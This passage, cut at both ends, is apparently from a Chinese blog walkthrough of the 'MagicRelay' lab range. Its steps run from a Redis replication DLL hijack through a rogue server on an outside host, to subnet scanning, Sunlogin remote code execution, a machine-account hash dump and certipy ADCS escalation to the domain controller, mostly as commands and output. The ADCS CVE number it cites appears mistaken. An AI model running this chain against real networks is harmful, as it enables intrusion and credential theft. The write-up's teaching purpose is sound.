class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">root@iZf8z44eks6m9aisejfxi7Z:/home/red/redis/RabR-main# python3 redis-attack.py -r 39.99.248.17 -L 47.113.229.136 -wf dbghelp.dll</span><br><span class="line"></span><br><span class="line">???????  ?????? ??????? ??????? </span><br><span class="line">????????????????????????????????</span><br><span class="line">????????????????????????????????</span><br><span class="line">????????????????????????????????</span><br><span class="line">???  ??????  ??????????????  ???</span><br><span class="line">???  ??????  ?????????? ???  ???</span><br><span class="line">Redis-Attack By Replication(linux:4.x/5.x win:&gt;=2.8) author:0671</span><br><span class="line"></span><br><span class="line">[*] Connecting to  39.99.248.17:6379...</span><br><span class="line">[*] Redis version: 3.0.504</span><br><span class="line">[*] OS: Windows  </span><br><span class="line">[*] Arch_bits: 64</span><br><span class="line">[*] Redis dbsize: 0</span><br><span class="line">[√] Can use master-slave replication to hijack dbghelp.dll to attack the redis</span><br><span class="line">[+] What do u want ? [h]ijack dbghelp.dll or [l]oad module or [e]xit: h</span><br><span class="line">[*] Saveing dbdata</span><br><span class="line">[*] Setting filename</span><br><span class="line">[*] Sending SLAVEOF command to server</span><br><span class="line">[+] Accepted connection from 39.99.248.17:6379</span><br><span class="line">[+] Accepted connection from 39.99.248.17:6379</span><br><span class="line">[*] Start listening on 47.113.229.136:16379</span><br><span class="line">[*] Tring to run payload</span><br><span class="line">[+] Accepted connection from 39.99.248.17:49809</span><br><span class="line">[*] Clean up..</span><br><span class="line">[*] Closing rogue server...</span><br><span class="line">[*] Refuseing dbdata </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-MagicRelay/14.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-MagicRelay/15.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-MagicRelay/16.png"></p><p>后渗透，这里还是上线vshell方便操作些</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-MagicRelay/17.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-MagicRelay/18.png"></p><p>直接用vshell挂载代理</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-MagicRelay/19.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-MagicRelay/20.png"></p><h2 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h2><h3 id="向日葵rce"><a href="#向日葵rce" class="headerlink" title="向日葵rce"></a>向日葵rce</h3><p>上传fscan进行内网信息收集</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Public&gt;fscan.exe -h 172.22.12.0/24</span><br><span class="line"></span><br><span class="line">   ___                              _</span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __</span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\</span><br><span class="line">                     fscan version: 2.0.0</span><br><span class="line">[*] 扫描类型: all, 目标端口: 21,22,80,81,135,139,443,445,1433,1521,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017,80,81,82,83,84,85,86,87,88</span><br><span class="line">,89,90,91,92,98,99,443,800,801,808,880,888,889,1000,1010,1080,1081,1082,1099,1118,1888,2008,2020,2100,2375,2379,3000,3008,3128,3505,5555,6080,6648,686</span><br><span class="line">8,7000,7001,7002,7003,7004,7005,7007,7008,7070,7071,7074,7078,7080,7088,7200,7680,7687,7688,7777,7890,8000,8001,8002,8003,8004,8006,8008,8009,8010,801</span><br><span class="line">1,8012,8016,8018,8020,8028,8030,8038,8042,8044,8046,8048,8053,8060,8069,8070,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,809</span><br><span class="line">4,8095,8096,8097,8098,8099,8100,8101,8108,8118,8161,8172,8180,8181,8200,8222,8244,8258,8280,8288,8300,8360,8443,8448,8484,8800,8834,8838,8848,8858,886</span><br><span class="line">8,8879,8880,8881,8888,8899,8983,8989,9000,9001,9002,9008,9010,9043,9060,9080,9081,9082,9083,9084,9085,9086,9087,9088,9089,9090,9091,9092,9093,9094,909</span><br><span class="line">5,9096,9097,9098,9099,9100,9200,9443,9448,9800,9981,9986,9988,9998,9999,10000,10001,10002,10004,10008,10010,10250,12018,12443,14000,16080,18000,18001,</span><br><span class="line">18002,18004,18008,18080,18082,18088,18090,18098,19001,20000,20720,21000,21501,21502,28018,20880</span><br><span class="line">[*] 开始信息扫描...</span><br><span class="line">[*] CIDR范围: 172.22.12.0-172.22.12.255</span><br><span class="line">[*] 已生成IP范围: 172.22.12.0 - 172.22.12.255</span><br><span class="line">[*] 已解析CIDR 172.22.12.0/24 -&gt; IP范围 172.22.12.0-172.22.12.255</span><br><span class="line">[*] 最终有效主机数量: 256</span><br><span class="line">[+] 目标 172.22.12.6     存活 (ICMP)</span><br><span class="line">[+] 目标 172.22.12.12    存活 (ICMP)</span><br><span class="line">[+] 目标 172.22.12.25    存活 (ICMP)</span><br><span class="line">[+] 目标 172.22.12.31    存活 (ICMP)</span><br><span class="line">[+] ICMP存活主机数量: 4</span><br><span class="line">[*] 共解析 218 个有效端口</span><br><span class="line">[+] 端口开放 172.22.12.25:6379</span><br><span class="line">[+] 端口开放 172.22.12.31:445</span><br><span class="line">[+] 端口开放 172.22.12.25:445</span><br><span class="line">[+] 端口开放 172.22.12.12:445</span><br><span class="line">[+] 端口开放 172.22.12.6:445</span><br><span class="line">[+] 端口开放 172.22.12.31:139</span><br><span class="line">[+] 端口开放 172.22.12.25:139</span><br><span class="line">[+] 端口开放 172.22.12.12:139</span><br><span class="line">[+] 端口开放 172.22.12.6:139</span><br><span class="line">[+] 端口开放 172.22.12.31:135</span><br><span class="line">[+] 端口开放 172.22.12.25:135</span><br><span class="line">[+] 端口开放 172.22.12.12:135</span><br><span class="line">[+] 端口开放 172.22.12.6:135</span><br><span class="line">[+] 端口开放 172.22.12.6:88</span><br><span class="line">[+] 端口开放 172.22.12.31:80</span><br><span class="line">[+] 端口开放 172.22.12.12:80</span><br><span class="line">[+] 端口开放 172.22.12.31:21</span><br><span class="line">[+] 存活端口数量: 17</span><br><span class="line">[*] 开始漏洞扫描...</span><br><span class="line">[+] Redis扫描模块开始...</span><br><span class="line">[!] 扫描错误 172.22.12.25:445 - read tcp 172.22.12.25:54809-&gt;172.22.12.25:445: wsarecv: An existing connection was forcibly closed by the remote host.</span><br><span class="line"></span><br><span class="line">[!] 扫描错误 172.22.12.12:445 - 无法确定目标是否存在漏洞</span><br><span class="line">[!] 扫描错误 172.22.12.31:445 - read tcp 172.22.12.25:54808-&gt;172.22.12.31:445: wsarecv: An existing connection was forcibly closed by the remote host.</span><br><span class="line"></span><br><span class="line">[*] NetBios 172.22.12.31    WORKGROUP\WIN-IISQE3PC</span><br><span class="line">[*] NetInfo</span><br><span class="line">[*] 172.22.12.25</span><br><span class="line">   [-&gt;] WIN-YUYAOX9Q</span><br><span class="line">   [-&gt;] 172.22.12.25</span><br><span class="line">[*] NetBios 172.22.12.6     [+] DC:WIN-SERVER.xiaorang.lab       Windows Server 2016 Standard 14393</span><br><span class="line">[!] 扫描错误 172.22.12.6:88 - Get &quot;http://172.22.12.6:88&quot;: read tcp 172.22.12.25:54822-&gt;172.22.12.6:88: wsarecv: An existing connection was forcibly c</span><br><span class="line">losed by the remote host.</span><br><span class="line">[*] OsInfo 172.22.12.6  (Windows Server 2016 Standard 14393)</span><br><span class="line">[*] NetInfo</span><br><span class="line">[*] 172.22.12.6</span><br><span class="line">   [-&gt;] WIN-SERVER</span><br><span class="line">   [-&gt;] 172.22.12.6</span><br><span class="line">[*] NetInfo</span><br><span class="line">[*] 172.22.12.12</span><br><span class="line">   [-&gt;] WIN-AUTHORITY</span><br><span class="line">   [-&gt;] 172.22.12.12</span><br><span class="line">[*] NetInfo</span><br><span class="line">[*] 172.22.12.31</span><br><span class="line">   [-&gt;] WIN-IISQE3PC</span><br><span class="line">   [-&gt;] 172.22.12.31</span><br><span class="line">[+] ftp 172.22.12.31:21:anonymous </span><br><span class="line">   [-&gt;]SunloginClient_11.0.0.33826_x64.exe</span><br><span class="line">[*] NetBios 172.22.12.12    WIN-AUTHORITY.xiaorang.lab          Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] 网站标题 http://172.22.12.12       状态码:200 长度:703    标题:IIS Windows Server</span><br><span class="line">[*] 网站标题 http://172.22.12.31       状态码:200 长度:703    标题:IIS Windows Server</span><br><span class="line">[+] [发现漏洞] 目标: http://172.22.12.12</span><br><span class="line">  漏洞类型: poc-yaml-active-directory-certsrv-detect</span><br><span class="line">  漏洞名称: </span><br><span class="line">  详细信息: %!s(&lt;nil&gt;)</span><br><span class="line">[!] 扫描错误 172.22.12.25:139 - netbios error</span><br><span class="line">[+] Redis 172.22.12.25:6379 发现未授权访问 文件位置:C:\Program Files\Redis/dump.rdb</span><br><span class="line">[+] 扫描已完成: 17/17</span><br><span class="line">[*] 扫描结束,耗时: 14.380259</span><br></pre></td></tr></table></figure><p>整理一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">172.22.12.6    DC:WIN-SERVER.xiaorang.lab  域控</span><br><span class="line">172.22.12.25   WIN-YUYAOX9Q.xiaorang.lab  redis未授权 dll劫持 已拿下 </span><br><span class="line">172.22.12.31   WORKGROUP\WIN-IISQE3PC  IIS网站 ftp匿名 向日葵rce</span><br><span class="line">172.22.12.12   WIN-AUTHORITY.xiaorang.lab  CA服务器 poc-yaml-active-directory-certsrv-detect</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看见有web服务，先打web</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-MagicRelay/21.png"></p><p>ftp和前面都提示了向日葵，可以rce</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-MagicRelay/22.png"></p><p>在靶机上传工具</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-MagicRelay/23.png"></p><p>先扫端口，也可以本地扫，但是在入口机扫更快</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xrkRce.exe -h 172.22.12.31  -t scan</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-MagicRelay/24.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Public&gt;xrkRce.exe -h 172.22.12.31  -t scan</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">╔═╗┬ ┬┌┐┌╦  ┌─┐┌─┐┬┌┐┌   ╦═╗┌─┐┌─┐</span><br><span class="line">╚═╗│ ││││║  │ ││ ┬││││───╠╦╝│  ├┤</span><br><span class="line">╚═╝└─┘┘└┘╩═╝└─┘└─┘┴┘└┘   ╩╚═└─┘└─┘</span><br><span class="line"></span><br><span class="line">                                                by:T00ls.net</span><br><span class="line">                                                向日葵Rce</span><br><span class="line">----------------------------------------------</span><br><span class="line"></span><br><span class="line">[Info] 正在扫描中,请稍等....</span><br><span class="line">[Info] 目标可能存在Rce!端口: 49686</span><br><span class="line">花费时间为: 1m48.0254409s</span><br><span class="line">----------------------------------------------</span><br><span class="line"></span><br><span class="line">C:\Users\Public&gt;xrkRce.exe -h 172.22.12.31  -t rce -p 49686 -c &quot;whoami&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">╔═╗┬ ┬┌┐┌╦  ┌─┐┌─┐┬┌┐┌   ╦═╗┌─┐┌─┐</span><br><span class="line">╚═╗│ ││││║  │ ││ ┬││││───╠╦╝│  ├┤</span><br><span class="line">╚═╝└─┘┘└┘╩═╝└─┘└─┘┴┘└┘   ╩╚═└─┘└─┘</span><br><span class="line"></span><br><span class="line">                                                by:T00ls.net</span><br><span class="line">                                                向日葵Rce</span><br><span class="line">----------------------------------------------</span><br><span class="line"></span><br><span class="line">[Info] 命令执行成功:</span><br><span class="line"> nt authority\system</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-MagicRelay/25.png"></p><p>本地也是能成功的</p><p>由于后面不需要用到改靶机就直接读flag吧，不上线了</p><p>C:&#x2F;Users&#x2F;Administrator&#x2F;flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">xrkRce.exe -h 172.22.12.31  -t rce -p 49686 -c &quot;dir C:/Users/Administrator/flag&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">D:\SRC\工具\后渗透\远控\xrkRce_win&gt;xrkRce.exe -h 172.22.12.31  -t rce -p 49686 -c &quot;dir C:/Users/Administrator/flag&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">╔═╗┬ ┬┌┐┌╦  ┌─┐┌─┐┬┌┐┌   ╦═╗┌─┐┌─┐</span><br><span class="line">╚═╗│ ││││║  │ ││ ┬││││───╠╦╝│  ├┤</span><br><span class="line">╚═╝└─┘┘└┘╩═╝└─┘└─┘┴┘└┘   ╩╚═└─┘└─┘</span><br><span class="line"></span><br><span class="line">                                                by:T00ls.net</span><br><span class="line">                                                向日葵Rce</span><br><span class="line">----------------------------------------------</span><br><span class="line"></span><br><span class="line">[Info] 命令执行成功:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Ŀ¼: C:\Users\Administrator\flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line"></span><br><span class="line">----                -------------         ------ ----</span><br><span class="line"></span><br><span class="line">-a----         2025/1/6     14:14            512 flag02.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">D:\SRC\工具\后渗透\远控\xrkRce_win&gt;xrkRce.exe -h 172.22.12.31  -t rce -p 49686 -c &quot;type C:/Users/Adm</span><br><span class="line">inistrator/flag/flag02.txt&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">╔═╗┬ ┬┌┐┌╦  ┌─┐┌─┐┬┌┐┌   ╦═╗┌─┐┌─┐</span><br><span class="line">╚═╗│ ││││║  │ ││ ┬││││───╠╦╝│  ├┤</span><br><span class="line">╚═╝└─┘┘└┘╩═╝└─┘└─┘┴┘└┘   ╩╚═└─┘└─┘</span><br><span class="line"></span><br><span class="line">                                                by:T00ls.net</span><br><span class="line">                                                向日葵Rce</span><br><span class="line">----------------------------------------------</span><br><span class="line"></span><br><span class="line">[Info] 命令执行成功:</span><br><span class="line">  ________ ___       ________  ________  ________    _______</span><br><span class="line">|\  _____\\  \     |\   __  \|\   ____\|\   __  \  /  ___  \</span><br><span class="line">\ \  \__/\ \  \    \ \  \|\  \ \  \___|\ \  \|\  \/__/|_/  /|</span><br><span class="line"> \ \   __\\ \  \    \ \   __  \ \  \  __\ \  \\\  \__|//  / /</span><br><span class="line">  \ \  \_| \ \  \____\ \  \ \  \ \  \|\  \ \  \\\  \  /  /_/__</span><br><span class="line">   \ \__\   \ \_______\ \__\ \__\ \_______\ \_______\|\________\</span><br><span class="line">    \|__|    \|_______|\|__|\|__|\|_______|\|_______| \|_______|</span><br><span class="line">flag02��flag&#123;29a46b72-8a82-182a-45f3-532475ec6fd4&#125;</span><br></pre></td></tr></table></figure><p>那么整理一下</p><h2 id="flag04"><a href="#flag04" class="headerlink" title="flag04"></a>flag04</h2><h3 id="ADCS"><a href="#ADCS" class="headerlink" title="ADCS"></a>ADCS</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">172.22.12.6    DC:WIN-SERVER.xiaorang.lab  域控</span><br><span class="line">172.22.12.25   WIN-YUYAOX9Q.xiaorang.lab  redis未授权 dll劫持 已拿下 </span><br><span class="line">172.22.12.31   WORKGROUP\WIN-IISQE3PC  IIS网站 ftp匿名 向日葵rce 已拿下</span><br><span class="line">172.22.12.12   WIN-AUTHORITY.xiaorang.lab  CA服务器 poc-yaml-active-directory-certsrv-detect</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>前面扫出来adcs</p><p>那么我们就可以靠这个拿下域控</p><p>Active Directory 域权限提升漏洞(CVE-2022-26963 )允许低权限用户在安装了 Active Directory 证书服务 (AD CS) 服务器角色的默认 Active Directory 环境中将权限提升到域管理员，修改DNSHostname为域控机器即可伪造域控机器申请证书</p><p>打adcs的前提已知一个域用户的账号密码</p><p>在这之前，我们需要先提权入口机，抓取到入口机的机器用户的hash</p><p>因为机器用户在域内</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-MagicRelay/26.png"></p><p>可以用SweetPotato</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-MagicRelay/27.png"></p><p>主播太懒，直接cs里抓hash</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-MagicRelay/28.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-MagicRelay/29.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[00000003] Primary</span><br><span class="line"> * Username : WIN-YUYAOX9Q$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : e611213c6a712f9b18a8d056005a4f0f</span><br><span class="line"> * SHA1     : 1a8d2c95320592037c0fa583c1f62212d4ff8ce9</span><br></pre></td></tr></table></figure><p>先获取CA证书名字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[06/18 17:07:51] beacon&gt; shell certutil</span><br><span class="line">[06/18 17:07:51] [*] Tasked beacon to run: certutil</span><br><span class="line">[06/18 17:07:51] [+] host called home, sent: 39 bytes</span><br><span class="line">[06/18 17:07:51] [+] received output:</span><br><span class="line">项 0:</span><br><span class="line">  名称:                   &quot;xiaorang-WIN-AUTHORITY-CA&quot;</span><br><span class="line">  部门:                   &quot;&quot;</span><br><span class="line">  单位:                   &quot;&quot;</span><br><span class="line">  区域:                   &quot;&quot;</span><br><span class="line">  省/自治区:              &quot;&quot;</span><br><span class="line">  国家/地区:              &quot;&quot;</span><br><span class="line">  配置:                   &quot;WIN-AUTHORITY.xiaorang.lab\xiaorang-WIN-AUTHORITY-CA&quot;</span><br><span class="line">  Exchange 证书:          &quot;&quot;</span><br><span class="line">  签名证书:               &quot;&quot;</span><br><span class="line">  描述:                   &quot;&quot;</span><br><span class="line">  服务器:                 &quot;WIN-AUTHORITY.xiaorang.lab&quot;</span><br><span class="line">  颁发机构:               &quot;xiaorang-WIN-AUTHORITY-CA&quot;</span><br><span class="line">  净化的名称:             &quot;xiaorang-WIN-AUTHORITY-CA&quot;</span><br><span class="line">  短名称:                 &quot;xiaorang-WIN-AUTHORITY-CA&quot;</span><br><span class="line">  净化的短名称:           &quot;xiaorang-WIN-AUTHORITY-CA&quot;</span><br><span class="line">  标记:                   &quot;1&quot;</span><br><span class="line">  Web 注册服务器:         &quot;&quot;</span><br><span class="line">CertUtil: -dump 命令成功完成。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>xiaorang-WIN-AUTHORITY-CA</p><p>那么接下来就先创建一个新的域内用户</p><p>在本地kali</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q certipy account create -u WIN-YUYAOX9Q$ -hashes e611213c6a712f9b18a8d056005a4f0f  -dc-ip 172.22.12.6 -user Hundredsu -dns WIN-SERVER.xiaorang.lab -debug</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/red/redis/RedisWriteFile-master]</span><br><span class="line">└─# proxychains4 -q certipy account create -u WIN-YUYAOX9Q$ -hashes e611213c6a712f9b18a8d056005a4f0f  -dc-ip 172.22.12.6 -user Hundredsu -dns WIN-SERVER.xiaorang.lab -debug</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[+] Authenticating to LDAP server</span><br><span class="line">[+] Bound to ldaps://172.22.12.6:636 - ssl</span><br><span class="line">[+] Default path: DC=xiaorang,DC=lab</span><br><span class="line">[+] Configuration path: CN=Configuration,DC=xiaorang,DC=lab</span><br><span class="line">[*] Creating new account:</span><br><span class="line">    sAMAccountName                      : Hundredsu$</span><br><span class="line">    unicodePwd                          : ViKxqBEGeEwj6B03</span><br><span class="line">    userAccountControl                  : 4096</span><br><span class="line">    servicePrincipalName                : HOST/Hundredsu</span><br><span class="line">                                          RestrictedKrbHost/Hundredsu</span><br><span class="line">    dnsHostName                         : WIN-SERVER.xiaorang.lab</span><br><span class="line">[*] Successfully created account &#x27;Hundredsu$&#x27; with password &#x27;ViKxqBEGeEwj6B03&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hundredsu$:ViKxqBEGeEwj6B03</span><br></pre></td></tr></table></figure><p>用创建好的账号申请一个证书</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 certipy req -u &#x27;Hundredsu$@xiaorang.lab&#x27; -p &#x27;ViKxqBEGeEwj6B03&#x27; -ca &#x27;xiaorang-WIN-AUTHORITY-CA&#x27; -target 172.22.12.12 -template &#x27;Machine&#x27; -debug -dc-ip 172.22.12.6</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-MagicRelay/30.png"></p><p>报错超时</p><p>忘记配&#x2F;etc&#x2F;hosts了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">172.22.12.6 WIN-SERVER.xiaorang.lab</span><br><span class="line">172.22.12.12 xiaorang-WIN-AUTHORITY-CA</span><br><span class="line">172.22.12.6 xiaorang.lab</span><br><span class="line">172.22.12.12 WIN-AUTHORITY.xiaorang.lab</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-MagicRelay/31.png"></p><p>配置完后运行两次成功</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-MagicRelay/32.png"></p><p>然后用证书获取域控机器账号的hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 certipy auth -pfx win-server.pfx -dc-ip 172.22.12.6 -debug</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(root?kali)-[/home/kali/red/redis/RedisWriteFile-master]</span><br><span class="line">└─# proxychains4 certipy auth -pfx win-server.pfx -dc-ip 172.22.12.6 -debug</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Using principal: win-server$@xiaorang.lab</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[proxychains] Strict chain  ... 